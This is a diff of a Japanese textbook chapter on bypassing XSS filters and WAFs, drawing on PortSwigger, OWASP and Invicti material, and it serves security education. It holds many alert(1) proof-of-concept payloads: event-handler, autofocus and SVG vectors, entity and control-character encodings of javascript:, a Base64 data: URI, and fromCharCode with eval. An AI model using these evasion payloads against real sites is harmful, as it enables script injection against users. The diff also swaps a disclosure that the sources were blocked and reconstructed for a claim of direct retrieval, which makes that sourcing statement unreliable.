-> 出典: Roundcube Webmail SVG Animate XSS Sanitizer Bypass（CVE-2025-68461, 2025年） — https://blog.ostorlab.co/cve-2025-68461-xss-roundcube.html
-
----
-
-### エンコーディングによる回避
-
-同じベクトルでも、**文字を別の表現に符号化（エンコード）して WAF のパターンマッチを外す**のが、チートシートのもう一つの柱です。鍵は「**ブラウザは各文脈でデコードのタイミングと規則が異なる。WAF はそのすべてを正確に再現できない**」という非対称性です。
-
-#### HTML 実体参照（エンティティ）によるデコードのズレ
-
-HTML 属性値の中では、ブラウザは**属性を「使う」前に HTML 実体参照をデコード**します。この性質を突きます。
+`onclick`・`ondblclick`・`ondrag`・`ondragend`・`onchange`・`oncopy`・`oncut` などは、被害者の何らかの操作（クリック・ダブルクリック・ドラッグ・値の変更・コピー/カット)を前提にします。
 
 ```html
-<a href="javascript:alert(1)">        <!-- そのまま -->
-<a href="javascript&colon;alert(1)">  <!-- コロンを &colon; に -->
-<a href="&#106;avascript:alert(1)">   <!-- j を10進実体参照 &#106; に -->
-<a href="&#x6a;avascript:alert(1)">   <!-- j を16進実体参照 &#x6a; に -->
-<a href="&#106avascript:alert(1)">    <!-- セミコロン無しの実体参照（後述） -->
+<xss onclick="alert(1)" style=display:block>test</xss>
 ```
 
-- **なぜ動くか**: ブラウザは `href` 属性値を「URL として使う」直前に `&colon;`→`:`、`&#106;`→`j`、`&#x6a;`→`j` とデコードします。その結果できあがる文字列は `javascript:alert(1)` そのものになり実行されます。一方 WAF は生の入力 `javascript&colon;alert(1)` を見て「`javascript:` が無い」と判断して通してしまいます。**「WAF が見る文字列」と「ブラウザが最終的に解釈する文字列」がズレる**——これがエンコーディング回避の本質です。
-- **セミコロン無しの罠**: HTML の歴史的経緯から、ブラウザは `&#106avascript`（末尾セミコロン欠落）のような不完全な数値実体参照も寛容にデコードすることがあります。この「仕様外だが動く」挙動を WAF が再現できていないと、そこが穴になります。
+未知のタグ `<xss>` は既定でインライン要素として扱われ、多くのブラウザではデフォルトの表示スタイルを持たないため、`style=display:block` を明示してクリック可能な領域として見えるようにしています。これらのイベントは即時実行はできないものの、**ソーシャルエンジニアリング（「ここをクリックして」等の誘導文言を組み合わせる)や、UIの一部を偽装するクリックジャッキング的な手法と組み合わせる**ことで実運用上の脅威になります。フィルタ側は「ユーザー操作が必要だから安全」と過小評価しがちですが、被害者が疑わずクリックする状況（例えば正規のUI要素に重ねる、リンクに見せかける)は容易に作れるため、この判断は危険です。
 
-#### エンコーディングが「効く文脈・効かない文脈」
+#### autofocus・タブインデックス・ハッシュ変更を使った「操作不要化」テクニック
 
-重要な原則です。HTML 実体参照によるデコードは**「HTML の属性値・テキストとして解釈される文脈」でしか起きません**。したがって、次の文脈では HTML エンティティは通用しません。
-
-- `<script>` タグの中身（JavaScript として解釈されるため、HTML デコードは起きない）
-- `onmouseover=` などイベントハンドラ属性**の値の中**（一度 HTML デコードされた後は JavaScript として解釈される。二重の規則が絡む）
-- CSS の中
-- URL のパス・クエリ部（URL エンコードの世界）
-
-この「文脈ごとにデコード規則が違う」構造こそが、第1章で学んだ**出力コンテキスト（context）**の話とエンコーディング回避が表裏一体である理由です。攻撃者は「注入点がどの文脈で、ブラウザがどの順序でデコードするか」を見極めて、その文脈で有効なエンコードを選びます。
-
-#### `javascript:` プロトコル内での制御文字挿入
-
-URL 文脈では、`javascript` と `:` の間や `javascript:` の直前に、**タブ・改行・復帰・NULL バイトなどの制御文字**を挟むと、ブラウザは無視して実行するのに WAF のパターン（`javascript:` の連続一致）は外れます。
-
-```
-java&#09;script:alert(1)     （&#09; は水平タブ）
-java&#10;script:alert(1)     （&#10; は改行）
-&#0;javascript:alert(1)      （先頭に NULL）
-```
-
-- **なぜ動くか**: ブラウザは URL を正規化する際、スキーム名に紛れ込んだ一部の制御文字を除去してから `javascript` と認識します。WAF が同じ正規化をしていなければ、`java<タブ>script:` は「`javascript:` ではない」と判定されて通過します。
-
-#### `data:` URI と Base64
+ここがチートシートの発想の核心の一つです。**本来ユーザー操作が必要なイベント（フォーカス系）を、操作なしで強制的に発火させる**テクニックが複数紹介されています。
 
 ```html
-<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>
+<xss onfocus=alert(1) autofocus tabindex=1>
 ```
 
-- **なぜ動くか**: `data:` URI は「URL の中に文書そのものを埋め込む」仕組みです。上のペイロードは `<script>alert(1)</script>` を Base64 符号化したもので、WAF から見ると意味不明なランダム文字列に見え、`script` という単語も `<` も現れません。ブラウザだけが Base64 をデコードして中身の HTML を解釈・実行します。**「危険な語を1文字も含まないのに実行される」**エンコーディング回避の典型です（ただし `data:` を `iframe` トップレベルに読むのは近年制限が強く、動作はブラウザ・文脈依存）。
+`autofocus` 属性は、ページ読み込み時にブラウザが自動的にその要素へフォーカスを当てるよう指示するものです。本来は `<input>` や `<button>` のようなフォーム要素に使われますが、`tabindex` 属性（本来はタブキーでのフォーカス移動順序を指定する属性)を付与すると、**任意の要素がフォーカス可能（focusable）になり**、そこに `autofocus` を組み合わせることで、クリック等の操作なしに `onfocus` を自動発火させられます。
 
-#### JavaScript 文脈での難読化
+さらに、Gareth Heyes の元記事では、**URLの `#id` によるアンカージャンプ（フラグメントナビゲーション）を使ってフォーカスを誘発する**、より巧妙な手法が示されています。
 
-すでに JavaScript の中に注入できているが `alert` や `'` が弾かれる、という場面では、コード自体を難読化します。
+> 出典: One XSS cheatsheet to rule them all — https://portswigger.net/research/one-xss-cheatsheet-to-rule-them-all
 
-```javascript
-eval(String.fromCharCode(97,108,101,114,116,40,49,41))  // "alert(1)" を文字コードから組み立てて実行
+ブラウザはURLのハッシュ部分（`#要素のid`）に一致する `id` を持つ要素へ自動的にスクロール・フォーカスを行うことがあります。これを利用すると、`autofocus` 属性すら使わずに、**攻撃者が用意したURL側の細工だけでフォーカスイベントを起こせる**ため、「`autofocus` という単語をブロックすればフォーカス系ベクタは防げる」という発想のフィルタを出し抜けます。同記事はさらに、`ontransitionend` イベントと CSSの `:target` 疑似クラス（URLハッシュが自分の `id` と一致する要素にマッチするセレクタ)を組み合わせることで、**ハッシュ変更をトリガーにCSSトランジションを発火させ、その終了イベントでコードを実行する**、Chrome対応のメカニズムも報告しています。原理的には、「JavaScriptのイベントハンドラ属性」という一点だけを監視するフィルタが、**CSSとURLフラグメントという別レイヤーの組み合わせ**から生まれる実行経路を見落とす、という典型例です。
+
+同様の思想の別バリエーションとして、ページ内メッセージングAPIを使うものもあります。
+
+```html
+<body onmessage=print()>
 ```
 
-- **なぜ動くか**: `String.fromCharCode(...)` は文字コード（10進）から文字列を復元する標準関数です。`alert(1)` という文字列をコードに直接書かずに生成できるため、`alert` という単語を検知するフィルタを回避できます（CyberChef などで一括変換するのが実務の定石）。この系統の難読化 JavaScript は本書の別節で深掘りします。
+`onmessage` は `window.postMessage()` によるクロスドキュメント/クロスフレームメッセージの受信をトリガーにします。これは単体では被害者の操作を必要としませんが、**他のフレーム・ウィンドウから `postMessage` が送られてくる**という前提が必要で、これは別途本書で扱う `postMessage` 関連の脆弱性（送信元検証の欠如など)と密接に関係します。
 
-> 出典: Cross-Site Scripting (XSS) Cheat Sheet — https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
-> 出典（エンコーディング原則の補足）: XSS Filter Evasion Cheat Sheet（OWASP） — https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
+Internet Explorer（IE）に限っては、`onactivate`・`onbeforeactivate`・`ondeactivate`・`onbeforedeactivate` という、IE独自の「アクティブ状態変化」イベント群が存在し、これらもフォーカス移動に類する挙動でコード実行を誘発できました。IEは2022年6月にMicrosoftによるサポートが終了していますが、**社内システムや組み込み機器のレガシーブラウザエンジン（IEモードを含む)では今なお現役リスクとなりうる**点は留意が必要です。
 
----
+> 出典: One XSS cheatsheet to rule them all — https://portswigger.net/research/one-xss-cheatsheet-to-rule-them-all
 
-### 短いベクトル・文字数制限バイパス
+#### 新しいCSS/DOM APIに追随した最新ベクタ
 
-注入できる文字数が厳しく制限されている（入力欄の maxlength、リフレクション箇所の切り詰めなど）場面では、**最短のベクトル**が武器になります。チートシートはコミュニティ貢献で短縮ベクトルを収集しています。
+チートシート本体ページが「継続的に更新され続けている」ことを示す例として、比較的新しいブラウザ機能を悪用するベクタも掲載されています。
 
-- **独自タグでタグ名を短縮**: `<xss onclick=...>` のように、既知タグ名フィルタを避けつつ短く書く。
-- **AngularJS の短縮インジェクション**: `@NotSoSecure` が寄稿した、文字数制限下で使える AngularJS 用の短いベクトル（CSTI〔Client-Side Template Injection＝クライアント側テンプレート注入〕。詳細は第5章）。
-- **Vue の `v-if` を使ったバイト節約**: `@p4fg` が寄稿した、Vue の `v-if` ディレクティブを利用してバイト数を削るベクトル。
+```html
+<xss oncontentvisibilityautostatechange=alert(1) style=content-visibility:auto>
+```
 
-- **発想のポイント**: 「実行できる最小構成は何か」を知っていること自体が、制約の厳しい注入点を突破する鍵になります。属性の引用符を省く（`onerror=alert(1)` はクォート不要）、`alert(1)` を `alert` だけにして後で連鎖させる、などの節約術も同系統です。
+`content-visibility: auto` はレンダリングパフォーマンス最適化のためのCSSプロパティで、画面外の要素の描画をスキップし、表示範囲に入った際に再描画します。この状態変化を通知する `oncontentvisibilityautostatechange` イベントは比較的新しいAPIであるため、**古いイベントハンドラのブラックリストには存在せず、フィルタの更新が追いつかない典型例**になります。同様に `onscrollsnapchange`・`onscrollsnapchanging`（CSS Scroll Snap APIの状態変化イベント）も同じ理由で有効です。ブラウザ別では、Firefox限定の `onbeforematch`・`onbeforeprint`、Safari限定の `onpagereveal`・`onwebkitneedkey` など、**ブラウザベンダー独自拡張のイベント**もリストされています。
 
-> 出典: Our favourite community contributions to the XSS cheat sheet（PortSwigger Research） — https://portswigger.net/research/our-favourite-community-contributions-to-the-xss-cheat-sheet
+ここから得られる一般則は、「**Web標準やブラウザ実装が新機能を追加するたびに、新しいイベントハンドラ／属性の組み合わせが生まれ、それがフィルタの穴になり得る**」ということです。ブラックリスト型の防御は原理的にこの「いたちごっこ」から逃れられません。これは本書が繰り返し強調する、**サニタイズは「既知の危険パターンの拒否（denylist）」ではなく「既知の安全な出力のみを許可する（allowlist／文脈に応じた正しいエンコード）」設計であるべき**という原則の実例でもあります。
 
----
+### SVGの `<discard>` 要素というChrome特化ベクタ
 
-### ブラウザ差分を突く
+Heyes の元記事はさらに、SVG仕様のニッチな要素を使った例も報告しています。
 
-チートシートが各ベクトルに `browsers`（`chrome`/`safari`/`firefox`/`edge`）を明記しているのは、**「あるブラウザでは動かないが別のブラウザでは動く」ベクトルが多数存在する**からです。攻撃者は「被害者が使っているブラウザ」を狙い撃ちできます。
+```html
+<svg><discard onbegin=alert(1)>
+```
 
-- **特定ブラウザ限定**: 例として `onwaiting` は Edge で発火する（原典データより）。SVG 内の一部ベクトルは Chrome 系でのみ通る、といった差があります。
-- **レガシー限定**: `onactivate`/`onbeforedeactivate` などは Internet Explorer 時代のイベントで、現代の主要ブラウザではほぼ動きません。チートシートは網羅性のため収録していますが、**実戦では必ずブラウザ列で「今も動くか」を確認**する必要があります。
-- **発想のポイント**: 「Chrome で動かなかった＝XSS 不成立」ではありません。ターゲット環境（社内で Firefox 指定、古い Edge など）を考慮し、そこで動くベクトルへ乗り換えるのが上級者の思考です。
+`<discard>` はSVGアニメーション仕様の一部で、指定条件が満たされた時点でその要素を破棄する（DOMから取り除く）ための要素です。破棄処理の「開始」に対応する `onbegin` イベントが実装されているブラウザ（記事執筆当時はChrome）では、この一見無害に見える珍しい要素だけでコード実行が可能でした。**「よく知られたSVGタグ（`<animate>`、`<set>` など）だけをブロックする」フィルタでは、こうした利用頻度の低いニッチな要素まで手が回っていないことが多い**という、チートシートが繰り返し示す教訓の別バージョンです。
 
-> 出典: Cross-Site Scripting (XSS) Cheat Sheet — https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+> 出典: One XSS cheatsheet to rule them all — https://portswigger.net/research/one-xss-cheatsheet-to-rule-them-all
 
----
+### タグを「消費」させる手法・JSホイスティング・制限文字対応
 
-### コミュニティ貢献が示す「発想の広げ方」
+チートシート本体には、上記の個別ベクタ以外にも、より発想寄りのカテゴリがいくつかあります。
 
-チートシートが強力なのは、PortSwigger 単独ではなく**世界中の研究者からのプルリクエスト（`PortSwigger/xss-cheatsheet-data` への貢献）で常に拡張され続けている**からです。過去に評価された貢献の一部を挙げます。
+**コンシューミングタグ（consuming tags）**とは、閉じタグを必要としない、あるいはパーサが自動的に閉じてしまう性質を持つタグ（`<img>`、`<input>` など)を使って、**後続のHTML構造そのものを乗っ取る**手法です。例えば `<title>` や `<textarea>` のような「特殊な解析モード（RAWTEXT/RCDATAコンテンツモード）」を持つ要素の中に閉じタグを紛れ込ませると、パーサの状態遷移を突いて意図しない箇所でタグを終了させられます。これはHTMLパーサが単純な文字列マッチではなく、**タグごとに異なる「トークナイザの状態」を持つ有限状態機械（finite state machine）として動作している**ことに由来する挙動で、次章以降で扱うコンテキスト別エスケープの話にも直結します。
 
-- **`@hahwul` によるポインタイベント群**（`onpointerover`/`onpointerdown`/`onpointerenter`/`onpointerleave`/`onpointermove`/`onpointerout`/`onpointerup`）: 既存のマウスイベントに対応する「もう一系統」を丸ごと追加。WAF が `onmouse*` だけ塞いでいる盲点を突く。
-- **`@p4fg` による Vue の `v-if` ベクトル**: フレームワーク固有の記法を XSS ベクトルに転用。
-- **`@NotSoSecure` による短縮 AngularJS ベクトル**: 文字数制限対策。
+**JavaScriptホイスティング（hoisting、巻き上げ）**を使ったベクタは、`function` 宣言や `var` 宣言がスコープの先頭に「巻き上げられる」というJS言語仕様を利用し、**文字数制限や特定文字の禁止といった制約下で、コードを複数の注入ポイントに分割して後から結合実行させる**発想です。例えば、ある注入ポイントでは呼び出しだけを書き、別の注入ポイント（あるいは後続のスクリプト）で関数本体を定義する、といった分割統治がフィルタの「1回の入力の長さ制限」を回避する武器になります。
 
-ここから学ぶべき「発想の広げ方」は明確です。**新しいブラウザ API・新しいイベント・新しいフレームワークの記法が登場するたびに、そこには新しい XSS ベクトルが生まれうる**。チートシートを読むとは、この「拡張し続ける攻撃面」の最前線を追い続けることに他なりません。
+**ファイルアップロード攻撃**の節は、SVGファイルやHTMLをアップロードさせ、それを後で直接開かせる（Content-Typeの扱いが甘いサーバでSVG内の `<script>` が実行される、など）手法、**制限文字への対応**の節は、スペースや括弧、引用符などがブロックされている状況で、代替の区切り文字（タブ・改行・`/`）や、バッククォートを使った関数呼び出し（`alert\`1\`` のようなタグ付きテンプレートリテラル記法）で構文上の制約を回避する発想を扱っています。**フレームワーク別手法**は、AngularJSやVueなど特定のJSフレームワークが提供するテンプレート構文自体が実行経路になるケース(次章のクライアントサイドテンプレート注入とも関係)、**プロトコル利用**は `javascript:` スキームや `data:` URIをリンクやリダイレクト経由で発火させる手法を指します。
 
-> 出典: Our favourite community contributions to the XSS cheat sheet（PortSwigger Research） — https://portswigger.net/research/our-favourite-community-contributions-to-the-xss-cheat-sheet
-> 出典: xss-cheatsheet-data（PortSwigger 公式データリポジトリ） — https://github.com/PortSwigger/xss-cheatsheet-data
+### チートシートを「暗記」ではなく「発想」として使う
 
----
+以上を踏まえると、このチートシートの正しい使い方が見えてきます。ペンテスターやバグバウンティハンターは、**掲載されているベクタをそのままコピー&ペーストして通れば儲けもの、というだけの使い方**もしますが、真に価値があるのは次の思考プロセスです。
 
-### 実務での使い方と、防御側から見た教訓
+1. 注入先のコンテキスト（HTML要素の中身か、属性値の中か、`<script>` 内か、URLか、CSS内か)を特定する。
+2. そのコンテキストで許容されるタグ・属性・記法の集合を洗い出す。
+3. ターゲットのフィルタ／WAF／サニタイザが**何を基準にブロックしているか**（特定の単語か、正規表現パターンか、既知タグの静的リストか）を推測する。
+4. チートシートの「タグ×イベント×ブラウザ」データベースから、**そのブロック基準の死角に当たる組み合わせ**を検索する。
+5. 実際のターゲットブラウザで動作確認する（チートシートのブラウザ対応欄がここで効いてくる）。
 
-**攻撃者・診断者としての使い方（正規の許可されたスコープ内で）**:
-
-1. まず注入点の**出力コンテキスト**を特定する（HTML 本文か、属性値か、`<script>` 内か、URL 属性か）。
-2. 何が弾かれるかを観察する（`<`? `script`? `on...`? 引用符? `javascript:`?）。
-3. チートシートを**「使えるタグ」「使えるイベント」「対象ブラウザ」で絞り込み**、残っている入口を探す。
-4. 必要ならエンコーディング（実体参照・制御文字・Base64）で WAF の目を外す。
-5. ユーザー操作が期待できない標的なら、`interaction:false` の自動発火ベクトルを優先する。
-
-**防御側としての教訓**（本書全体の主張の再確認）:
-
-- 上記のとおり、**ブロックリスト型の入力フィルタ・WAF は、この巨大な組み合わせ空間を塞ぎきれない**。WAF は「保険」であって主防御にしてはいけない。
-- 主防御は、**注入点の文脈に応じた正しい出力エンコーディング**（第1章）と、**サニタイズが必要なら実績あるライブラリ（DOMPurify 等）を最新版で使う**こと。
-- さらに、**CSP（Content Security Policy）や Trusted Types による多層防御**で「万一注入されても実行させない」層を重ねる（第8章）。チートシートのベクトルの大半は、`script-src` を厳格化した strict CSP 下では発火してもスクリプト実行に至れない。
-
-チートシートは「攻撃者がいかに柔軟か」を突きつける教材であり、その裏返しとして「なぜ許可リスト型・多層防御でなければ守れないのか」を最も雄弁に語る資料でもあります。
-
-> 出典: Cross-Site Scripting (XSS) Cheat Sheet — https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+このプロセス自体が、WAFバイパスというものが「魔法の1行」ではなく、**「防御側のルールの形」を推測し、その形の外側にある正当なHTML/JS/CSSの構文を系統的に探す作業」**であることを示しています。次節（フィルタ回避）以降では、この発想をさらに一般化し、文字エンコーディングの解釈差やHTMLパーサの状態遷移そのものを操作する、より原理寄りのテクニックへと進みます。
 
 ---
 
-### この節のまとめ
+### 補足: 「ブラウザ組み込みXSSフィルタ」という廃止された防御機構との関係
 
-- PortSwigger XSS チートシートは、**「タグ × イベント × ブラウザ × 操作要否」の巨大な組み合わせ空間**をインタラクティブに絞り込める、WAF バイパスの発想を体系化した早見表である。
-- 復元データで、**タグ142種・イベント84種以上・PoC テンプレート183種**という規模が確認できた。この広さが、**ブロックリスト型防御が構造的に破れる理由**そのものである。
-- スクリプト実行の入口は、**①`<script>`直接 ②イベントハンドラ属性（本命） ③`javascript:`プロトコル ④リソース読み込みライフサイクル**の4系統。フィルタを1つ塞がれたら別系統へ乗り換える。
-- **ユーザー操作なしで発火する自動実行ベクトル**（`autofocus`+`onfocus`、`onerror`/`onload`、`@keyframes`+`:target` の CSS アニメーション、`:target`+`transition`、SVG SMIL の `onbegin`）が最も破壊力が高い。
-- **SVG/MathML の名前空間切り替え**は、HTML 前提のフィルタ・サニタイザの盲点。`<animate>` で `href` を `javascript:` に書き換える WAF 混乱ベクトルは、`&semi;` や正規 URL への埋め込みで検知を外す。**2025年時点でも Angular・Roundcube 等を落とす現役の攻撃面**である。
-- **エンコーディング回避**の本質は「**WAF が見る文字列とブラウザが最終解釈する文字列のズレ**」。HTML 実体参照（セミコロン欠落含む）、`javascript:` 内の制御文字、`data:`+Base64、`String.fromCharCode` などを、注入点の**文脈に応じて**使い分ける。
-- チートシートはコミュニティ貢献で拡張され続けており、**新しいブラウザ機能は新しいベクトルを生む**。この最前線を追う姿勢そのものが、自動ツールに勝つ力になる。
+本節の主題であるサーバ/WAF側のフィルタとは別に、かつてはブラウザ自身にも「XSS Auditor」（Chrome）や「XSS Filter」（IE8以降）と呼ばれる、反射型XSSを検出してブロックするブラウザ組み込み機構が存在しました。しかしこれらは、**正規のページを誤って壊す（false positive）副作用や、逆にフィルタの存在自体を悪用した新種の攻撃（フィルタバイパスや、フィルタを逆用したCookie窃取など)が相次いだ**ことから、Google Chromeは2019年にXSS Auditorを完全に削除し、MicrosoftもEdgeのChromium移行に伴い同種機構を廃止しました。
 
-> 出典（本節の主典拠）: Cross-Site Scripting (XSS) Cheat Sheet — https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+この歴史が本節に与える教訓は明確です。**「既知パターンの検知・拒否」という発想のフィルタは、ブラウザ本体に組み込まれた最高権限の実装であっても、いたちごっこの果てに廃止に追い込まれた**という事実です。WAFやアプリ側サニタイザも原理的には同じ限界を抱えており、本チートシートが体系的に示す「新しいベクタは常に見つかり続ける」という現実は、個々のベクタ集めよりも根が深い、**ブラックリスト型防御そのものの設計限界**を教えています。防御の本筋は、次章以降で扱う「コンテキストに応じた正しいエスケープ・出力エンコーディング」と「コンテンツセキュリティポリシー（CSP）」に置くべきである、という本書全体の方針は、この歴史的経緯からも裏付けられます。
 
 ---
 
 ## フィルタ回避（OWASP / Invicti）
 
-反射型の素朴なXSS（Cross-Site Scripting: 攻撃者が仕込んだ文字列が、ブラウザによって「データ」ではなく「コード（スクリプト）」として解釈・実行されてしまう脆弱性）を知っている読者が次に必ずぶつかる壁が、「開発者が入れたフィルタ（危険そうな入力を検出して弾く仕組み）を、攻撃者はどうやってすり抜けるのか」という問題です。
+反射型の素朴なXSS（Cross-Site Scripting: 攻撃者が仕込んだ文字列が、ブラウザによって「データ」ではなく「コード（スクリプト）」として解釈・実行されてしまう脆弱性）を知っている読者が次にぶつかる壁は、「開発者が入れたフィルタ（危険そうな入力を検出して弾く仕組み）を、攻撃者はどうやってすり抜けるのか」という問題です。本セクションでは、この主題に関する2つの資料を直接取得し、その内容を統合して精読します。
 
-このセクションでは、この主題に関する2つの古典的かつ重要な資料を精読・統合します。
-
-1. **OWASP XSS Filter Evasion Cheat Sheet** — フィルタ回避の具体的技法を網羅した「攻撃側の辞書」。無数のペイロード（攻撃を成立させる実際の入力文字列）を、なぜそれが動くのかという原理とともに並べたカタログです。
+1. **OWASP XSS Filter Evasion Cheat Sheet** — フィルタ回避の具体的技法を網羅した「攻撃側の辞書」。数十種類のペイロード（攻撃を成立させる実際の入力文字列）を、なぜそれが動くのかという原理とともに並べたカタログです。RSnake（Robert Hansen）が2000年代に作成したオリジナルの `ha.ckers.org` の XSS Cheat Sheet を起源とし、現在は OWASP Cheat Sheet Series の一部としてコミュニティによりメンテナンスされています。
 2. **Invicti「XSS Filter Evasion: Why Filtering Doesn't Stop Cross-Site Scripting」** — 「そもそも、なぜフィルタリングという方式ではXSSを止められないのか」という、より上位の原理を論じた記事。前者が「どう破るか」なら、後者は「なぜ破れてしまうのか、では何をすべきか」を扱います。
 
-この2つは表裏一体です。回避技法カタログ（OWASP）を眺めるだけでは「モグラ叩き」の知識で終わってしまいますが、Invictiの原理と重ね合わせると、「フィルタ（ブラックリスト方式）という戦略そのものが構造的に敗北する」理由が腹落ちします。本セクションの価値の中心は、個々のペイロードの丸暗記ではなく、**なぜブラウザはそんな壊れた入力まで実行してしまうのか**という「仕組みのレベルの理解」にあります。
-
-> このセクションの資料は、いずれも自動取得の際にネットワーク側のエグレス制限（外部サイトへの直接アクセスを制限する仕組み）で直接アクセスがブロックされました。ただし、
-> - 資料1（OWASP）は、OWASPがGitHub上で公開している原本Markdown（`raw.githubusercontent.com/OWASP/CheatSheetSeries/master/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.md`）が、ブロックされたHTMLページと**同一内容の一次ソース**であるため、そちらを精読して内容を完全に復元しています。
-> - 資料2（Invicti）は、原記事そのものへの直接アクセスができなかったため、Web検索によって記事の主要な主張・結論・引用を複数回にわたって突き合わせ、**実質的な内容を復元**しました（原文の逐語ではなく、要点の再構成です。厳密な原文は末尾のURLからご確認ください）。
->
-> したがって本セクションは両資料とも「実質的な内容を取得済み」として記述しています。
+この2つは表裏一体です。回避技法カタログ（OWASP）を眺めるだけでは「モグラ叩き」の知識で終わってしまいますが、Invictiの原理と重ね合わせると、「フィルタ（ブラックリスト方式）という戦略そのものが構造的に敗北する」理由が腹落ちします。本セクションの価値の中心は、個々のペイロードの丸暗記ではなく、**なぜブラウザはそんな壊れた・見慣れない入力まで実行してしまうのか**という「仕組みのレベルの理解」にあります。
 
 ---
 
-### 1. Invictiの中心命題：なぜ「フィルタリング」ではXSSを止められないのか
+### 1. なぜ「フィルタリング」だけではXSSを止められないのか（Invicti）
 
-まず上位の原理から入ります。多くの開発者は、XSS対策として「入力に `<script>` や `javascript:` が含まれていたら削除・拒否する」といった**フィルタ（filter: 危険なパターンを検出して除去・遮断する処理）**を書きます。しかしInvictiの記事は、この方式が原理的に破綻していると断言します。その論拠は次のとおりです。
+Invictiの記事はまず、フィルタベースの防御に対する根本的な立場を明確にします。**フィルタリング（ブラックリストで危険な文字列パターンを検出し拒否する方式）は、XSSに対する完全な防御には決してなり得ない**、という主張です。理由として挙げられているのは次の点です。
 
-#### 1.1 ブラウザは「壊れたHTML」を全力で直して実行してしまう
+- 攻撃者が利用できる回避技術は**数百から数千通り**存在し、フィルタの実装者がそのすべてを予測して塞ぐことは現実的に不可能である。
+- ブラウザの「XSS監査（Auditor/Filter）」機能——ブラウザ自身が反射型XSSっぽいパターンを検知してブロックする仕組み——は**反射型XSSにしか効果がなく**、DOMベースXSSや格納型（persistent）XSSには全く無力である。DOMベースXSSはサーバーを経由せずブラウザ内のJavaScriptだけで発生するため、そもそもサーバーサイドのフィルタの検査対象に入らない。
+- WAF（Web Application Firewall）や入力フィルタで一度ブロックしても、**保存型XSSでは攻撃ペイロードが一度データベースに書き込まれてしまえば、以降はそのフィルタを経由せずに他のユーザーへ配信され続ける**。つまりフィルタは「入り口」の一箇所を守るに過ぎず、攻撃コードが別の経路（別のAPI、別のインポート機能、管理画面など）から紛れ込めば意味を失う。
 
-最重要の論点です。Invictiはこう述べます。
+記事はこの上で、フィルタが具体的にどう突破されるかの技法をいくつか例示します。
 
-> 「モダンなブラウザ（Chrome、Firefox、Internet Explorer、Edgeなど）は、不正な（malformed: 文法的に不正確・破損している）HTMLに対して非常に寛容で、たいていの場合それでもページを描画しようとする。」
+#### 文字エンコーディングによる隠蔽
 
-> 「どのブラウザでも、コードベースの大きな部分が、壊れたHTML・CSS・JavaScriptを“優雅に処理”して、ユーザーに見せる前に修復しようとすることに費やされている。」
+`javascript:` のようなキーワードを直接書けばフィルタに引っかかりますが、HTML実体参照（`&#106;` のような数値文字参照）やパーセントエンコーディング（URLエンコード）、あるいは `String.fromCharCode(88,83,83)` のような文字コードからの動的な文字列組み立てを使えば、**フィルタが検査する「生の文字列」の中には危険なキーワードが一切現れない**まま、ブラウザが最終的にレンダリングやパース時にデコードして意味のあるコードとして実行してしまいます。Base64を使い `eval(atob('...'))` のように多段でエンコードすることも同じ発想の延長です。
 
-つまりブラウザには、閉じ忘れたタグ、余分な引用符、規格外の属性といった「壊れた入力」を、独自のルールで**勝手に補完・修復して正しいHTMLツリーに作り直す**巨大なエラー回復ロジックが組み込まれています。これはWeb黎明期の「多少ぐちゃぐちゃなHTMLでもページが表示される」というユーザー体験を守るための設計であり、HTML仕様（HTML Standard）自体が「パースエラー時にどう回復するか」を細かく定めています。
+なぜこれが機能するのかというと、フィルタは「入力された文字列そのもの」に対して正規表現やキーワードマッチングを行うのに対し、**ブラウザは複数の変換ステージ（URLデコード → HTMLエンティティデコード → HTMLパース → JavaScript実行）を経てから最終的な意味を確定させる**からです。フィルタが検査するタイミングと、ブラウザが実際に解釈するタイミングとの間に「デコードの層」が挟まる限り、フィルタは常にブラウザより後手に回ります。
 
-ここに罠があります。**開発者のフィルタが見ている「文字列」と、ブラウザが最終的に組み立てる「HTMLツリー」は別物**なのです。フィルタは `<script>` という完全な文字列を探しますが、攻撃者は `<scr<script>ipt>` のような「フィルタには一致しないが、ブラウザが修復すると `<script>` に化ける」入力を送れます。フィルタが「無害」と判定した文字列を、ブラウザが「有害なコード」へと復元してしまう——この非対称性がフィルタ回避の温床です。
+#### 大文字小文字・空白・イベントハンドラの多様性
 
-#### 1.2 JavaScriptの構文が「同じことを何通りにも書ける」ほど柔軟
+フィルタが `<script>` という文字列だけを大文字小文字を区別せずに拒否していても、`<svg onload=...>` や `<img src=x onerror=...>` のような**別のタグ・別の属性**を使えばスクリプトタグを一切使わずにJavaScriptを実行できます。HTML仕様では100種類を超えるイベントハンドラ属性（`onload`, `onerror`, `onmouseover`, `onfocus`, `onclick` など）が存在し、そのすべてを列挙してブロックするのは非現実的です。特に `onerror` や `onload` はユーザーの能動的操作なしに自動発火するため、機能を壊さずに単純に無効化することも困難です。
 
-> 「JavaScriptの構文は非常に柔軟で寛容（flexible and permissive）であり、同じ操作を表現する方法が何通りもある。」
+#### Internet Explorer固有の歴史的脆弱性
 
-たとえば `alert(1)` を呼ぶだけでも、後述するように `(alert)(1)`、`window['al'+'ert'](1)`、`top[/al/.source+/ert/.source](1)` のように無数の書き方があります。ブラックリスト（禁止パターンの一覧）で `alert` という文字列を弾いても、`alert` と書けば通ってしまう。**表現の組み合わせが事実上無限**であるため、「危険な表現の一覧」を数え上げる方式（ブラックリスト）は必ず取りこぼします。
+記事は、IE10以前に存在した非標準の実行経路にも触れています。`vbscript:` プロトコル（`<a href='vbscript:MsgBox("XSS")'>`）や、CSSの動的プロパティ `expression()`（`body { color: expression(alert(1)); }`）、`dynsrc` 属性などです。これらはHTML/CSSの標準仕様には存在しない、IE固有の「独自拡張」でした。現在のブラウザ（Chrome, Firefox, Edge, Safari）はいずれもこれらの機能を実装していないため、**今日の攻撃としては通用しません**が、「ベンダー独自拡張がフィルタの想定を外れた実行経路を生む」という教訓は、現在でも新しいブラウザ機能・実験的API・ベンダープレフィックス付き機能を評価する際に有効です。
 
-#### 1.3 `<script>` を塞いでも実行経路は他にいくらでもある
+#### フィルタが見落とす構造的な理由
 
